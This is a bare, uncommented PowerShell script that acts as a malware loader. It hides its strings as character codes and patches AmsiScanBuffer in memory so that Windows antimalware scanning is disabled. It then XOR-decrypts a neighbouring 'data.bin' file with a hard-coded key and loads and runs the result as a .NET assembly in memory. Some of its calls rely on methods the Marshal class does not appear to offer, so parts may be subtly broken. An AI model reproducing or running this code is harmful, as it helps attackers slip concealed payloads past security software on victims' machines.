$r = [Runtime.InteropServices.Marshal]
$w = [IntPtr]::Size
$g = $r.GetMethod('GetDelegateForFunctionPointer',[type[]]@([IntPtr],[Type]))
$h1 = $r::('GetModuleHandle').Invoke('kern'+'el32')
$h2 = $r::('GetModuleHandle').Invoke((-join[char[]](97,109,115,105,46,100,108,108)))
$a1 = $r::('GetProcAddress').Invoke($h1,('Virtual'+'Protect'))
$a2 = $r::('GetProcAddress').Invoke($h2,(-join[char[]](65,109,115,105,83,99,97,110,66,117,102,102,101,114)))
$rb = [UInt32].MakeByRefType()
$dt = [Func``5].MakeGenericType([IntPtr],[UInt32],[UInt32],$rb,[Boolean])
$vp = $g.Invoke($null,@($a1,$dt))
$op = [uint32]0
$null = $vp.Invoke($a2,[uint32]$w,0x40,[ref]$op)
$b = if($w -eq 8){[byte[]](0xB8,0x57,0x00,0x07,0x80,0xC3)}else{[byte[]](0xB8,0x57,0x00,0x07,0x80,0xC2,0x18,0x00)}
$r::Copy($b,0,$a2,$b.Length)
$null = $vp.Invoke($a2,[uint32]$w,$op,[ref]$op)


$cf = Join-Path (Split-Path $MyInvocation.MyCommand.Path) 'data.bin'
$rb2 = [IO.File]::ReadAllBytes($cf)
$sk = [byte[]]@(0x4D,0xC3,0xA7,0x1F,0x92,0xE8,0x5B,0x36,0xFA,0x01,0x6E,0xB4,0x29,0xD5,0x83,0x7C)
$pb = [byte[]]::new($rb2.Length)
for($i=0;$i -lt $rb2.Length;$i++){$pb[$i]=$rb2[$i] -bxor $sk[$i % $sk.Length]}
$dm = [AppDomain]::CurrentDomain
$lo = $dm.GetType().GetMethod('Load',[type[]]@([byte[]])).Invoke($dm,@(,$pb))
$lo.EntryPoint.Invoke($null,@(,[string[]]@())) | Out-Null
